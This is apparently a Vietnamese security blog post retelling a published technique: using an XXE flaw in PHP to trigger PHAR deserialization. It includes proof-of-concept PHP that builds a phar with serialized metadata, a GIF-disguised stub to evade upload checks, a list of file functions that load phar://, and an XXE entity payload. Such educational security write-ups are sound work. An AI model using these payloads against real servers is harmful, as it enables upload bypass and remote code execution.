---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "Từ XXE Attack đến Phar Deserialization trong PHP 7.4"
subtitle: ""
summary: "Mình tình cờ đọc được bài Out of Hand :: Attacks Against PHP Environments - phân tích những điểm đáng chú ý về bảo mật của PHP 7.4. Trong bài có đoạn viết về cách tận dụng lỗi XXE để kích hoạt Phar Deserialization. Mình sẽ trình bày lại theo cách hiểu của mình."
authors: []
tags: []
categories: []
date: 2020-10-27T00:55:55+07:00
lastmod: 2020-10-27T00:55:55+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
Mình tình cờ đọc được bài <a href="https://srcincite.io/assets/out-of-hand-attacks-against-php-environments.pdf">Out of Hand :: Attacks Against PHP Environments</a> - phân tích những điểm đáng chú ý về bảo mật của PHP 7.4. Trong bài có đoạn viết về cách tận dụng lỗi <strong>XXE</strong> để kích hoạt <strong>Phar Deserialization</strong>. Mình sẽ trình bày lại theo cách hiểu của mình.</p>

## 1. Điều kiện khai thác lỗi
<ul>
<li>Tồn tại lỗi <strong>XXE</strong> (<code>libxml_disable_entity_loader=False</code>)</li>
<li><code>phar.readonly</code> phải được <code>disable</code> (mặc định trong php là <code>enable</code>).</li>
</ul>

## 2. Phar Deserialize

<p>Một cách tóm lược, <strong>Phar - PHP Archive</strong> là một dạng nén ứng dụng php vào 1 file thực thi duy nhất. Nó có thể được load thông qua wrapper <strong>phar://</strong>. Kỹ thuật <strong>Phar Deserialization</strong> là việc tận dụng unserialize phần Metadata trong Phar Manifest Format file để kích hoạt POP chains (cách hiện thực unserialize của Phar wrapper không phải trực tiếp thông qua <strong>unserialize()</strong> nên giữa chúng có đôi chút khác nhau). Tùy thuộc vào cách vận dụng mà việc deserialize có thể dẫn đến <strong>RCE</strong>.<br>
<img src="Screenshot from 2020-10-03 14-50-08.png" alt="Screenshot-from-2020-10-03-14-50-08"></p>
<p><strong>Minh họa kịch bản tấn công Phar Deserialize</strong>:</p>
<ol>
<li>Attacker tạo file <code>phar.phar</code> để upload lên server

```php
<?php $phar= new Phar('phar.phar'); // Khởi tạo phar
$phar->startBuffering();
$phar->addFromString('phar.txt', '<valid>test</valid>'); // Thêm file data vào phar
$phar->setStub('<?php __HALT_COMPILER(); ? >'); // Thiết lập STUB cho phar
class AnyClass{}
$object = new AnyClass; // Khởi tạo đối tượng POP chains
$object->data = "pwned!"; // Truyền data
$phar->setMetadata($object); // Thiết lập Metadata cho phar, đối tượng sẽ được lưu dưới dạng serialized trong phar
$phar->stopBuffering();
```
</li>
<li>Server gọi một hàm file operations, ví dụ <code>file_exist()</code>, thì sẽ kích hoạt deserialize bên trong <strong>Metadata</strong>

```php
<?php
libxml_disable_entity_loader(False);
// Class được tận dụng để khai thác POP chains
class AnyClass{
    function __destruct() {
        die($this->data);
    }
}
file_exists('phar://.//phar.phar/test.txt'); // Load file phar
</code></pre>
</li>
</ol>
<ul>
<li>Ở <strong>(1)</strong>, để thực hiện kỹ thuật này nay, cần phải đưa file phar lên phía server trước. Có thể thông qua tính năng upload file, ảnh,... Điểm cộng là <code>phar://</code> xử lý file không phụ thuộc vào phần mở rộng, và phần đầu format file phar là vùng <strong>STUB</strong> có thể được chỉnh sửa thành signature của file ảnh để bypass MIME và file extension restriction:<pre><code class="language-php">$phar = new Phar("phar.gif");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
...
rename('phar.phar','phar.gif');
```
</li>
<li>Ở <strong>(2)</strong>, có rất nhiều hàm file operation có thể tận dụng wrapper <code>phar://</code>. Dưới đây là một số gợi ý:

```php
include('phar://phar.phar/test.txt');
file_get_contents('phar://phar.phar/test.txt');
file_put_contents('phar://phar.phar/test.txt', '');
copy('phar://phar.phar/test.txt', '');
file_exists('phar://phar.phar/test.txt');
is_executable('phar://phar.phar/test.txt');
is_file('phar://phar.phar/test.txt');
is_dir('phar://phar.phar/test.txt');
is_link('phar://phar.phar/test.txt');
is_writable('phar://phar.phar/test.txt');
fileperms('phar://phar.phar/test.txt');
fileinode('phar://phar.phar/test.txt');
filesize('phar://phar.phar/test.txt');
fileowner('phar://phar.phar/test.txt');
filegroup('phar://phar.phar/test.txt');
fileatime('phar://phar.phar/test.txt');
filemtime('phar://phar.phar/test.txt');
filectime('phar://phar.phar/test.txt');
filetype('phar://phar.phar/test.txt');
getimagesize('phar://phar.phar/test.txt');
exif_read_data('phar://phar.phar/test.txt');
stat('phar://phar.phar/test.txt');
lstat('phar://phar.phar/test.txt');
touch('phar://phar.phar/test.txt');
md5_file('phar://phar.phar/test.txt');
gzfile('phar://phar.phar/test.txt');
gzopen('phar://phar.phar/test.txt','r');
readgzfile('phar://phar.phar/test.txt');
pg_trace('phar://phar.phar/test.txt');
ftp_get('phar://phar.phar/test.txt');
ftp_get($conn_id, 'phar://phar.phar/test.txt', $server_file);
ftp_nb_get($my_connection, 'phar://phar.phar/test.txt', "whatever", FTP_BINARY);
error_log('phar://phar.phar/test.txt');
```
</li>
</ul>
<p>Nhiều phết :v.</p>
<p>Như vậy, chỉ cần <code>phar.readonly=0</code> và attacker kiểm soát file path của một trong những hàm trên thì có thể thực hiện <strong>Phar Deserialization</strong>.</p>

## 3. XXE Trigger Phar Deserialization

<p>Tuy nhiên, không phải lúc nào chúng ta cũng có thể kiểm soát được file path trong các hàm trên. Việc tìm ra càng nhiều vector load <code>phar://</code> wrapper khác nhau, sẽ càng giúp tăng khả năng khai thác thành công. Giả sử chúng ta phát hiện 1 vector tấn công <strong>XXE</strong> trên server, không có <code>expect://</code> wrapper để <strong>RCE</strong>, không có service nào để tận dụng <strong>SSRF</strong>, thì lúc này việc có thể kích hoạt <strong>Deserializeation</strong> sẽ tăng rất nhiều cơ hội để leo thang impact.</p>
<p>Với cùng kịch bản tấn công ở phần 2, nhưng thay vì kiểm soát được input của <code>file_exists</code>, mà server lại tồn tại lỗi XXE, thì attacker vẫn có thể tấn công <strong>Phar Deserialzation</strong> thông qua <code>libxml</code>:</p>

```php
$xml = '<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "phar://phar.gif/test.txt"> ]><r>&amp;sp;</r>';
$test = new SimpleXMLElement($xml, LIBXML_NOENT, 0);
// Hoặc
simplexml_load_string($xml, LIBXML_NOENT);
// Hoặc
$dom = new DOMDocument();
$dom->loadXML($xml,LIBXML_NOENT);
```
<ul>
<li>Bên trong <a href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c">libxml.c</a> có đoạn gọi:</li>
</ul>

```c
xmlParserInputBufferCreateFilenameDefault(php_libxml_input_buffer_create_filename);
...
php_libxml_input_buffer_create_filename(const char *URI, xmlCharEncoding enc);
...
{
    ...
	if (LIBXML(entity_loader_disabled)) {
		return NULL;
	}
    ...
    context = php_libxml_streams_IO_open_read_wrapper(URI);
```

<p>là lý do vì sao cần <code>libxml_disable_entity_loader=False</code>. Vì trình độ pwn ~= 0 nên mình cũng không đào sâu hơn cách <code>libxml</code> thực thi nữa, mà chỉ trình bày ở mức vận dụng là chính.</p>
<p>Rõ ràng việc thực thi được <strong>deserialize</strong> sẽ dễ dẫn đến những impact cao hơn. Có thể vận dụng các Gadget Chains đã được tìm thấy trước đó trong các framework như Laravel, Wordpress, CodeIgniter, ... (<a href="https://github.com/ambionics/phpggc">PHPGGC</a> hỗ trợ rất tốt cho việc này). Hoặc tự mình tìm một Gadget Chain mới luôn thì càng tuyệt vời! :d.</p>

## Kết luận

<p>Như vậy, mình vừa trình bày lại kỹ thuật <strong>Phar Deserialization</strong> với nhiều vector khác nhau, và một vector tấn công thông qua <strong>XXE</strong>. Đây sẽ là một hướng exploit đáng để thử khi tìm được lỗ hổng <strong>XXE</strong> trên hệ thống.</p>

## References

<ul>
<li><a href="https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf</a></li>
<li><a href="https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066">https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066</a></li>
<li><a href="https://files.ripstech.com/slides/PHP.RUHR_2018_New_PHP_Exploitation_Techniques.pdf">https://files.ripstech.com/slides/PHP.RUHR_2018_New_PHP_Exploitation_Techniques.pdf</a></li>
</ul>